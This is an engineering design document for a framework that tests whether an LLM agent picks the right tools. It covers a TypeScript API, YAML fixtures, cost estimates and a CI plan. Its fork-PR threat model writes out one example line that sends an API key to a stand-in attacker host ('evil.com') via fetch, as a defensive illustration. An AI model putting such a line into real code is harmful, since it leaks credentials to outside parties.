# Agent eval framework — testing LLM tool-selection behavior

**Status:** review v3 (incorporates Gemini review v2 feedback — YAML DSL serialization + honest fork-PR threat model)
**Owner:** `@boring/agent`
**Last updated:** 2026-04-28

## Problem

We have two distinct layers under test, and only one is currently covered:

| Layer | What it asserts | Today's coverage |
|---|---|---|
| **Plumbing** | Tool registered in catalog → bridge dispatches → workspace responds → state round-trips | `createWorkspaceAgentApp.test.ts`, `createInMemoryBridge.test.ts`, `uiCommandDispatcher.test.ts`, etc. — green. |
| **Behavior** | Given a user prompt + the agent's tool catalog + tool descriptions, does the LLM pick the right tool with the right params? | NONE. |

Recent example proving the gap exists: a user said "open a chart of Real GDP" and the agent confidently reported "Opened: Real GDP (GDPC1) in the chart pane" while the workbench was actually empty. Plumbing all worked. The LLM didn't realize it could call `exec_ui openFile`, didn't think to consult `get_ui_state.availablePanels` first, and made up a `chart` component name. That's a behavior bug, not a plumbing bug, and no test would have caught it.

The behavior layer needs its own framework, and it should live in `@boring/agent`. Reasons:

1. **Tool catalog ownership.** The catalog lives in agent. Whether a prompt resolves correctly depends on the descriptions, the JSON schema enums, and the system prompt — all of which the agent owns or contributes.
2. **Reusable across hosts.** Workspace, boring-macro, the playground, full-app — anything built on `@boring/agent` will want to assert against its own tool catalog. The framework can't live in any one consumer.
3. **Wraps existing primitives.** The mechanism is just "create an agent app, post a chat, capture the tool calls" — already entirely possible via `app.inject`. We're packaging that as a typed assertion helper, not inventing new infrastructure.

## Goal

Add `@boring/agent/testing` exporting:

- `evalAgentPrompt(opts)` — single-prompt eval. Posts a chat through `app.inject`, captures the FULL list of tool calls in the response, and returns a structured pass/fail.
- `runEvalSuite(opts)` — batch runner over a YAML fixture file. Strict 100% pass with per-prompt retries; suite-level timeout; sane concurrency cap.
- A matcher DSL — `EvalAny`, `EvalRegex`, partial vs strict, plus `someCallMatches` (default) vs `firstCallMatches` for prompts where order matters.

Two consumption modes:

- **In a vitest test** — small assertion suites for ONE prompt → one or more expected calls. Useful for pinning a tool description against a specific regression.
- **As a standalone CLI** (`pnpm agent:eval suite.yaml`) — large suites of 50+ prompts run nightly in CI against a real model.

## API sketch (revised per review)

### Single-prompt eval

```ts
// @boring/agent/testing
import type { FastifyInstance } from 'fastify'

export interface ToolCall {
  tool: string
  params: Record<string, unknown>
}

export interface ExpectedCall {
  /** Exact tool name match. Required. */
  tool: string

  /** Partial-match on the call params (every key in expect.params must
   *  appear with matching value; extra keys allowed unless `strict: true`). */
  params?: Record<string, unknown>

  /** When true, params must equal exactly (no extra keys). */
  strict?: boolean
}

export interface EvalPromptOptions {
  /** A FastifyInstance from createAgentApp / createWorkspaceAgentApp / etc. */
  app: FastifyInstance

  /** User prompt sent to the agent. */
  prompt: string

  /**
   * Expected tool calls. Default mode: assert that EVERY ExpectedCall here
   * matches AT LEAST ONE call in the LLM's response (any order).
   * Anthropic / OpenAI both support parallel tool calls in a single
   * response, so the framework treats `actual` as an array and runs an
   * existence check per expected entry — matching the wire reality.
   */
  expect: ExpectedCall | ExpectedCall[]

  /**
   * Stricter alternative: assert the FIRST tool call matches `expectFirst`.
   * Use when ordering matters (e.g. "agent must call get_ui_state BEFORE
   * exec_ui openPanel"). Mutually exclusive with `expect`.
   */
  expectFirst?: ExpectedCall

  /**
   * Negative assertion: assert that NO tool was called (LLM answered in
   * plain text). Use for "what is 2+2" style prompts where over-tooling
   * is the regression.
   */
  expectNoToolCall?: boolean

  /**
   * Model id. Each consumer can pin its own — defaults to the agent
   * package's pinned model from `eval.config.json` (currently
   * "claude-haiku-4-5-20251001"). Suites should override at the suite
   * level (in the YAML file) so workspace's eval can run on Haiku
   * while boring-macro's runs on Sonnet without a global migration.
   */
  model?: string

  /** Optional system prompt prepended to the chat session. Defaults to none. */
  systemPrompt?: string

  /** Override the chat session id (defaults to a fresh uuid per call). */
  sessionId?: string

  /**
   * Per-call timeout. Defaults to 30s. If the API hangs, fail fast at
   * this boundary so the suite-level timeout (below) doesn't have to
   * absorb every prompt's tail latency.
   */
  timeoutMs?: number

  /**
   * Per-prompt retry count. Defaults to 0. Set to 1 or 2 for prompts
   * known to flake on stochastic noise — strictly preferred over a
   * global pass-rate threshold (which masks genuine regressions in
   * specific tools — see the "100% pass" rationale below).
   */
  retries?: number
}

export interface EvalResult {
  ok: boolean
  /** All tool calls the LLM made, in order. Empty array means LLM answered
   *  in plain text without tooling. */
  actual: ToolCall[]
  /** Plain-text response from the LLM (empty string when only tools called). */
  text: string
  /** Human-readable reason on failure. */
  reason?: string
  /** Tokens consumed — for cost telemetry. */
  usage?: { input: number; output: number }
  /** How many attempts were used (1 + retries on failure). */
  attempts: number
}

export async function evalAgentPrompt(opts: EvalPromptOptions): Promise<EvalResult>

// Wildcards — JS API
export const EvalAny: unique symbol
export function EvalRegex(re: RegExp): { __evalRegex: RegExp }
```

### YAML serialization for matcher wildcards (per v2 review)

Fixtures are YAML, but `EvalAny` is a JS `Symbol` and `EvalRegex` is a function returning a tagged object. A naive `yaml.parse(...)` would treat `id: EvalAny` as the literal string `"EvalAny"`. Need a deliberate serialization strategy.

**Choice: custom YAML tags** (using the `yaml` package's `Schema` API).

```yaml
prompts:
  - prompt: open the GDP chart
    expect:
      tool: exec_ui
      params:
        kind: openPanel
        params:
          id: !EvalAny                 # any non-undefined value
          component: !EvalRegex "^chart:"   # regex match against string
```

The framework registers two custom tags with the YAML parser:

- `!EvalAny` (no value) → resolves to the `EvalAny` symbol.
- `!EvalRegex "regex-source"` (scalar) → resolves to `EvalRegex(new RegExp(...))`. The string is the regex source (no flags syntax — keep it simple; if a fixture needs flags, embed them via `(?i)` etc. inline).

**Rejected alternatives** and why:

- **Reserved string prefixes (`__EVAL_ANY__`)** — works but uglier in fixtures, and easy to confuse with a real string value an LLM might emit.
- **Object syntax (`{ $evalAny: true }`)** — also works but verbose for the common case (single-key object every wildcard). Custom tags are syntactically lighter (`!EvalAny` vs `{$evalAny:true}`) and more discoverable when a reader sees them in a fixture.

Both rejected alternatives stay valid via the JS API (`evalAgentPrompt` called directly from a vitest test) — only the YAML loader needs the custom-tag knowledge.

### Suite runner

```ts
export interface SuiteOptions {
  app: FastifyInstance

  /** Path to a YAML file. See "Fixture format (YAML)" below. */
  fixturesPath: string

  /**
   * Stop running and fail fast on first non-pass. Default: false (run
   * the whole suite, print every failure, then fail).
   */
  bail?: boolean

  /**
   * Concurrency. Default: 4. Higher = faster + more API tokens consumed
   * in parallel. Each prompt has its own per-call timeoutMs.
   */
  concurrency?: number

  /**
   * Hard suite-level timeout in ms. Defaults to 5 * 60_000 (5 minutes).
   * If API latency degrades, this fails the suite fast rather than
   * waiting for every prompt to time out individually.
   */
  suiteTimeoutMs?: number

  /**
   * Optional global override of the per-prompt model. Useful for ad-hoc
   * "run this suite against Sonnet instead of Haiku" experiments
   * without editing the YAML.
   */
  model?: string
}

export interface SuiteReport {
  total: number
  passed: number
  failed: number
  /**
   * NOT exposed as a "threshold" knob. The suite passes IFF every prompt
   * passed (after retries). Aggregate pass rate is a number reported for
   * telemetry, not a knob to silently mask broken tools — see "100% pass
   * rationale" below.
   */
  passRate: number
  results: Array<EvalResult & { prompt: string; expected: ExpectedCall | ExpectedCall[] | undefined }>
  totalUsage: { input: number; output: number }
  totalDurationMs: number
  /** True iff every result is `ok: true`. */
  allPassed: boolean
}

export async function runEvalSuite(opts: SuiteOptions): Promise<SuiteReport>
```

### 100% pass rationale (per Gemini review)

The first plan offered a `threshold` knob (default 1.0, optionally lowered to 0.9 for "noisy" suites). That's a footgun: a 50-prompt suite at threshold 0.9 silently passes when ALL THREE of `openPanel`'s prompts fail (94% aggregate). The aggregate masks a specific tool regression.

Replaced with strict 100% pass + a `retries` knob per prompt for the small handful of prompts that genuinely flake. If a prompt flakes consistently, the right response is to:
- Tighten the matcher (`EvalAny` instead of pinning a generated id)
- Loosen the `params` (drop optional fields the LLM sometimes adds)
- Rewrite the prompt to be less ambiguous

Not "let one tool be silently broken because the other 47 passed."

## Fixture format — YAML (revised per review)

YAML over JSONL because nested `expect.params` is unreadable on a single line and quote-escaping inside `prompt` strings is hostile. Suite-level config (model, system prompt, defaults) lives at the file head.

```yaml
# packages/agent/eval/standard-tools.yaml
model: claude-haiku-4-5-20251001
systemPrompt: |
  You are a coding assistant. Use the registered tools to act on the user's
  workspace. Prefer purpose-built tools over generic shell commands when both apply.
defaults:
  retries: 0
  timeoutMs: 30000

prompts:
  - prompt: open README.md
    expect:
      tool: exec_ui
      params:
        kind: openFile
        params:
          path: README.md

  - prompt: what files do I have open?
    expect:
      tool: get_ui_state

  - prompt: close the active tab
    expect:
      tool: exec_ui
      params:
        kind: closePanel

  - prompt: show me the GDP series
    expect:
      tool: exec_ui
      params:
        kind: openPanel
        params:
          component: chart-canvas
    retries: 1   # this prompt is more open-ended; allow one stochastic retry

  - prompt: what is 2 plus 2?
    expectNoToolCall: true   # plain-text response — no tool needed

  - prompt: open the README and tell me about the project
    # Multi-call expectation — both tools must appear (any order). Anthropic
    # supports parallel tool calls; the matcher checks existence, not order.
    expect:
      - tool: exec_ui
        params:
          kind: openFile
          params:
            path: README.md
      - tool: read
        params:
          path: README.md

  - prompt: navigate to line 42 of foo.ts
    # Order-sensitive: agent should call openFile FIRST, then navigateToLine.
    expectFirst:
      tool: exec_ui
      params:
        kind: openFile
        params:
          path: foo.ts
```

YAML structure:

- **`model`** (top-level) — pinned model for this suite. Each suite can pin independently; bumping is a deliberate edit per-suite, not a global migration.
- **`systemPrompt`** (top-level, optional) — prepended to every prompt in the suite.
- **`defaults`** (top-level, optional) — applied to every prompt unless overridden inline.
- **`prompts`** (array) — each entry is a `prompt` + one of `expect` / `expectFirst` / `expectNoToolCall`, plus optional per-prompt overrides for `retries`, `timeoutMs`, `model`.

Why structured YAML over inline `app.inject` calls in vitest: a single source of truth for the suite that non-engineers can edit (UX writers tweaking system prompts, product managers adding regression prompts after a bug report). The CLI runs the same parser as `runEvalSuite`.

## Architecture

```
                     ┌─────────────────────────┐
                     │  evalAgentPrompt(opts)  │
                     └────────────┬────────────┘
                                  │
                    1. session = uuid()
                    2. POST /api/v1/agent/sessions {id: session}
                    3. POST /api/v1/agent/chat   {sessionId, model, message, systemPrompt?}
                    4. Stream SSE response, capture EVERY tool-call event
                       (parallel + sequential calls all collected) plus the
                       final assistant text.
                    5. Match captured calls against expect / expectFirst /
                       expectNoToolCall.
                    6. Retry on failure up to opts.retries times.
                    7. DELETE /api/v1/agent/sessions/<id> (cleanup).
                    8. Return EvalResult with actual: ToolCall[], text,
                       attempts, usage.
                                  │
                                  ▼
                     ┌─────────────────────────┐
                     │  app.inject(...)        │
                     │  (no real network for   │
                     │  the Fastify routes —   │
                     │  in-process)            │
                     └────────────┬────────────┘
                                  │ But the LLM call ITSELF goes
                                  │ over the wire via the harness
                                  │ — that's the entire point.
                                  ▼
                     ┌─────────────────────────┐
                     │ Real LLM (Anthropic)    │
                     │ via ANTHROPIC_API_KEY   │
                     └─────────────────────────┘
```

Plumbing (Fastify, agent harness, tool dispatch) is in-process via `app.inject`. The LLM call itself is real. Cost lives at the model API boundary; controlling model choice + prompt count + retry budget controls the spend.

## Non-determinism strategy (revised)

Three layers of tolerance, in order of preference:

1. **Partial-match by default.** `params: { kind: "openFile", params: { path: "README.md" } }` matches actual `{ kind: "openFile", params: { path: "README.md", mode: "view" } }` — the extra `mode` key is allowed unless `strict: true`. Handles "model decided to add an optional param."

2. **Wildcards for fields that can't be pinned.** `EvalAny` for "must be present, any value" — useful for ids the model generates fresh each run (`id: EvalAny` for openPanel). `EvalRegex(/^chart:/)` for prefix matching without pinning the suffix.

3. **Per-prompt retries** for the rare prompt that's genuinely stochastic. Keep retries small (1–2). If a prompt needs 5 retries to pass, the prompt or matcher is wrong, not the LLM.

**Removed from the design**: the suite-level `threshold` (e.g., 0.9 = 90% pass rate). Per Gemini's review, an aggregate threshold lets a specific tool break entirely without failing CI. Strict 100% pass + targeted retries handles the same problem honestly.

**Multi-call matching**: Anthropic / OpenAI both emit multiple tool calls in a single response (parallel) or across turns (sequential). The default matcher mode is `someCallMatches` — assert each `ExpectedCall` exists somewhere in the captured `actual: ToolCall[]`, any order, parallel or sequential. `expectFirst` is the explicit opt-in for ordering, used only when ordering is part of the contract.

## Cost model

| Scenario | Tokens | Approx cost (Haiku 4.5 @ $1/M input, $5/M output) |
|---|---|---|
| Single eval (50 input + 30 output tokens incl. tool descriptions) | 80 | $0.0002 |
| 50-prompt suite | 4,000 | $0.01 |
| Nightly run @ 50 prompts × 30 days | 120,000 | $0.30 / month |
| Per-PR run @ 50 prompts × 100 PRs/month | 400,000 | $1 / month |

Per-PR is cheap enough to consider. Default cadence: **nightly** to start; can promote to per-PR once we trust the matcher fuzz heuristics.

## CI integration (revised — fork PR + secret leakage handled)

| Stage | When | What runs | Where the secret lives |
|---|---|---|---|
| Vitest unit | Every PR | Plumbing tests + framework matcher unit tests (no LLM) + a tiny canary eval (3 prompts, ~$0.001/PR) gated on `ANTHROPIC_API_KEY`. If absent, skip cleanly with a logged warning + green CI. | Repo secrets (NOT exposed to fork PRs). |
| **Fork PR maintainer trigger** | Maintainer comments `/eval` on a fork PR | A `pull_request_target`-triggered workflow with explicit environment protection runs the full suite with the secret. Security: the workflow MUST checkout the PR's HEAD, but only runs the eval task — no arbitrary scripts from the PR are executed. | Repo secrets, scoped to the `eval` environment. |
| Nightly | Cron at 03:00 UTC | Full eval suites for every consumer (workspace, boring-macro, full-app). Reports posted as a GitHub Actions summary. | Repo secrets. |
| On-demand | `pnpm agent:eval suite.yaml` | Local + manual debugging. Defaults to dry-run if `ANTHROPIC_API_KEY` is missing (prints what would have been sent). | User's local env / vault. |

**Fork PR security — honest threat model** (clarified per v2 review):

Without `pull_request_target`: fork PRs can change tool descriptions and the maintainer wouldn't see eval failures pre-merge.

With naive `pull_request_target` and no gate: a malicious fork could swap eval scripts to exfiltrate the API key during the workflow run.

The mitigation is a **maintainer-trust gate**, NOT a sandbox:

- A maintainer comments `/eval` on the fork PR — GitHub Actions checks the comment author's identity against repo permissions before running the workflow.
- The workflow runs in a protected `eval` environment that requires explicit manual approval before exposing the secret.
- The framework's runner script (loaded from `main`) drives the suite — but it imports the PR's tool catalog and app factory (e.g., `createWorkspaceAgentApp`, the host's `extraTools`, etc.) to run the evals against. **That PR-controlled code DOES execute in a Node process where `ANTHROPIC_API_KEY` is present.**
- A malicious fork PR could put `fetch('evil.com', {body: process.env.ANTHROPIC_API_KEY})` in a tool file, and `/eval` would run it.

The guarantee this provides: the maintainer must visually review the PR's diff before typing `/eval`. There is no automated firewall — the maintainer is the firewall. This is the standard OSS pattern for cost-bearing or capability-bearing secrets in CI (the same shape used by most projects that run benchmarks against fork PRs), but maintainers must understand they are authorizing untrusted code execution in an environment that holds the key.

If we want a stronger guarantee, the next step is moving the eval runner to a separate, secret-bearing service that ONLY accepts pre-built fixture artifacts (no PR-defined code paths). That's significantly more infrastructure and out of scope for v1.

## Cadence summary

- **Per PR (cheap)**: matcher unit tests + 3-prompt canary. ~$0.001 / PR.
- **Nightly (full)**: every consumer's suite. ~$0.30 / month at 50 prompts / suite.
- **Fork PR (manual)**: maintainer comments `/eval`, full suite runs once.

A failing nightly doesn't block merging; it surfaces a regression for triage. A failing per-PR canary blocks. A failing fork PR `/eval` blocks merging that fork PR.

## Migration / authoring path

1. Land the framework in `@boring/agent/eval` with one fixture file (`packages/agent/eval/standard-tools.yaml`) covering bash / read / write / edit / find. Validates the framework on agent's own catalog.
2. Child apps that compose workspace UI can add app-local eval suites (for example under `apps/*/eval/`) and wire their own app server as the `runEvalSuite({ app, fixturesPath })` target. Workspace itself does not publish a parallel eval subpath; it owns structural UI-tool contracts and app-shell helpers.
3. Documentation pass — agent README + app docs reference suite locations and the package `eval` script.
4. CI — add the nightly workflow + the per-PR canary step + the fork-PR `/eval` trigger.

## Out of scope (v1)

- **Multi-turn evals.** The framework asserts within a single LLM response (which CAN contain multiple parallel tool calls — that's covered). "Did the agent recover after a tool error in turn 1 and try a different approach in turn 2?" is a separate layer needing state replay. Track for v2.
- **Cross-model comparison runner.** A natural ask but adds an abstraction layer the harness doesn't currently need. The per-suite `model` knob already lets consumers experiment manually.
- **Streaming-aware evals.** Tool calls are captured atomically once the response stream completes. "Did the agent stream the right partial chunks in the right order?" is a separate ergonomic concern — defer.
- **Cost budget guardrails in CI.** A failsafe that aborts the suite if estimated tokens exceed a threshold. Add as a v1.1 ergonomic if usage spikes start being a concern; not blocking v1 launch.
- **Mocked LLM mode.** Some consumers may want to exercise the eval framework without an API key (deterministic CI, replay). Expensive to implement well (the mock has to faithfully emit Anthropic-shaped tool-use blocks); defer until requested.
- **Context window awareness.** A consumer could mock a `get_ui_state` response so small that the LLM's behavior in production (with a much larger state) wouldn't match. Document the recommendation in the README ("write fixtures with realistic state shapes") but don't enforce in framework — the consumer owns their app's runtime state, the framework can't.

## Risks (revised)

1. **Real-LLM dependency.** Eval suite needs `ANTHROPIC_API_KEY`. Mitigation: framework defaults to dry-run with a printed warning when no key is found. CI matrix has a fork-PR step that exercises this path. Per-PR canary is gated on the secret being present.

2. **Model deprecation.** Anthropic deprecates models on rolling cadence. Mitigation: per-suite model pinning (in YAML) means consumers upgrade at their own pace. A bumped model in the agent package's `eval.config.json` is the DEFAULT, not a forced migration.

3. **Fixture rot.** Tool descriptions change → fixtures may need updating. Mitigation: matchers are partial-match by default; only contract changes (tool renamed, kind removed) require fixture edits, and those are big enough to deserve a PR review pass anyway.

4. **Cost spike from a runaway loop.** A bug where retries fire on every transient failure could 100x spend. Mitigation: explicit per-call `timeoutMs` (default 30s), explicit `retries` knob (default 0), explicit suite-level `suiteTimeoutMs` (default 5min), hard concurrency cap (default 4). No automatic retries on top of the explicit `retries`.

5. **Fork PR secret exfiltration.** Mitigation in CI integration section above — `pull_request_target` + `/eval` comment gate + maintainer approval + framework runner from `main` not from PR.

## Open questions (resolved + remaining)

| Q | Resolution |
|---|------------|
| ~~Should fixtures be JSONL or YAML?~~ | YAML (per review). |
| ~~Should the matcher support negative assertions?~~ | Yes — `expectNoToolCall: true`. |
| ~~Should `actual` be a single tool call or an array?~~ | Array (per review). Anthropic's parallel tool-call protocol requires it. |
| ~~Should `evalAgentPrompt` capture the full session log?~~ | Partially — `actual: ToolCall[]` + `text: string` + `usage`. Full per-message transcript with tool-result stages is v2 (multi-turn evals). |
| Should we ship a small "playground" CLI for manual prompt iteration? | Defer. Adjacent to evals but pulls UX in a different direction. |
| Where do per-host fixture files live? | Decentralized per-package: `packages/<consumer>/eval/*.yaml`. Each consumer asserts against the catalog they actually deploy. |

## Done definition

- [ ] `@boring/agent/testing` exports `evalAgentPrompt`, `runEvalSuite`, `EvalAny`, `EvalRegex`, plus the result + options + matcher types.
- [ ] One fixture file (`packages/agent/eval/standard-tools.yaml`) with ≥ 5 prompts covering bash / read / write / edit / find. Suite runs against `createAgentApp` and passes against the pinned model on a clean run.
- [ ] CLI: `pnpm --filter @boring/agent eval [path]` runs a suite and exits non-zero on any failure (or on suite-level timeout).
- [ ] Vitest unit tests for the matcher (partial-match, EvalAny, EvalRegex, strict mode, missing key, type mismatch, parallel-call existence check, expectFirst ordering, expectNoToolCall negative). NO real LLM in unit tests — the matcher is exercised against fixed `ToolCall[]` inputs.
- [ ] One canary vitest suite using a real LLM, gated on `ANTHROPIC_API_KEY` being present (skip-with-warning otherwise), runs ≤ 3 prompts to validate the framework end-to-end without burning tokens on every PR.
- [ ] Documentation in `packages/agent/README.md` + a one-paragraph reference in `packages/workspace/docs/plans/archive/WORKSPACE_V2_PLAN.md`.
- [ ] CI workflow files: nightly cron + per-PR canary + fork-PR `/eval` trigger with environment protection.
- [ ] No-API-key path: framework prints a clear "skipping evals: ANTHROPIC_API_KEY not set" warning and exits 0. Verified by a CI matrix entry that runs the canary without the secret set.
